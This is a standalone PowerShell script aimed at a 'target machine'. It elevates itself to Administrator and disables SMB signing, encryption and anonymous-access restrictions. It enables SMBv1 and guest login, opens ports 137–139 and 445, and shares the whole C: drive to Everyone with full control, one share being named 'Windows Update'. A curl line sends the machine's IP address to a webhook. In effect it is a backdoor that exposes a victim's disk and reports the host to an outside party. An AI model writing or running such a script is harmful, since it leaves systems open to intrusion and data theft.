# Function to check if the script is run as Administrator
function Test-Admin {
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# If not running as Administrator, relaunch the script with elevated permissions
if (-not (Test-Admin)) {
    Write-Host "This script requires Administrator privileges. Restarting as Administrator..."
    Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSCommandPath" -Verb RunAs
    exit
}

# fetch interface alias of the active network adapter
# method 1 (might contain multiple aliases)
# $interfaceAlias = (Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }).Name

# method 2 (more precise)
$interfaceAlias = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.InterfaceAlias

# or alternative for method 2
# $interfaceAlias = (Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).NetAdapter.Name

Set-NetConnectionProfile -InterfaceAlias $interfaceAlias -NetworkCategory Private

# Enable Network Discovery
Write-Host "Enabling Network Discovery..."
netsh advfirewall firewall set rule group="network discovery" new enable=yes

# Enable File and Print Sharing
Write-Host "Enabling File and Print Sharing..."
netsh firewall set service type=fileandprint mode=enable profile=all
Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Enabled True -Profile Any
Set-NetFirewallRule -Name "FPS-SMB-In-TCP" -Enabled True


# Set registry values for allowing anonymous access to the drive
Write-Host "Modifying registry settings for anonymous access..."
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "restrictanonymous" /t REG_DWORD /d 0 /f
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name everyoneincludesanonymous -Value 1 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" -Name restrictnullsessacces -Value 0 -Force
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "AllowInsecureGuestAuth" -Value 1 -Force
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "NullSessionShares" /t REG_MULTI_SZ /d "MyShare" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v "NullSessionPipes" /t REG_MULTI_SZ /d "srvsvc" /f
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -All -NoRestart

# Ensure SMBv1 is enabled (if necessary, as it is deprecated)
Write-Host "Enabling SMBv1..."
try {
    Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
}
catch {
    Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -All -NoRestart
    Set-SmbServerConfiguration -EnableSMB1Protocol $true -Force
}
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
Set-SmbServerConfiguration -EncryptData $false -Force
Set-SmbServerConfiguration -RejectUnencryptedAccess $false -Force
Set-SmbServerConfiguration -RequireSecuritySignature $false -Force
Set-SmbServerConfiguration -EnableGuestLogin $true -Force
Set-SmbServerConfiguration -AutoShareServer $true -Force
Set-SmbServerConfiguration -EnableSecuritySignature $false -Force

# Ensure TCP/UDP Ports are open in target machine's firewall
Write-Host "Allowing TCP/UDP Ports..."
New-NetFirewallRule -DisplayName "Allow SMB Ports" -Direction Inbound -Protocol TCP -LocalPort 139,445 -Action Allow -Profile Any
New-NetFirewallRule -DisplayName "Allow NetBIOS Ports" -Direction Inbound -Protocol UDP -LocalPort 137,138 -Action Allow -Profile Any

# Allow Function Discovery Resource Publication
Get-Service FDResPub
Start-Service FDResPub
Set-Service FDResPub -StartupType Automatic

# Get-IP (for windows use curl.exe)
curl -F "content=$((Get-NetIPConfiguration | Where-Object {$_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress)" "webhook-url"

# icacls "C:\" /grant "Everyone:(OI)(CI)F" /T

# Share the Drive (C:\ in this case)
Write-Host "Sharing C: drive..."
New-SmbShare -Name "Root" -Path "C:\" -FullAccess "Everyone" 
Grant-SmbShareAccess -Name "Windows Update" -AccountName "Everyone" -AccessRight Full -Force

# Set permissions for the shared drive
Write-Host "Setting permissions for the shared drive..."
$acl = Get-Acl "C:\"
$permission = "Everyone","FullControl","ContainerInherit,ObjectInherit","None","Allow"
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$acl.SetAccessRule($accessRule)
Set-Acl -Path "C:\" -AclObject $acl

Restart-Service -Name "LanManServer" -Force

Write-Host "All actions completed successfully."



# Enable Network Discovery (only)
# Set-NetFirewallRule -DisplayGroup "Network Discovery" -Enabled True

# Enable File and Printer Sharing (for Private network only)
# Set-NetFirewallRule -DisplayGroup "File and Printer Sharing" -Profile Private -Enabled True

# Allow authenticated users to access shared resources
# Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "everyoneincludesanonymous" -Value 0 -Force
# Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters\" -Name "restrictnullsessacces" -Value 1 -Force

# Share a specific folder (e.g., C:\SharedFolder) instead of the whole C: drive
# New-SmbShare -Name "Windows Update" -Path "C:\SharedFolder" -FullAccess "Everyone"
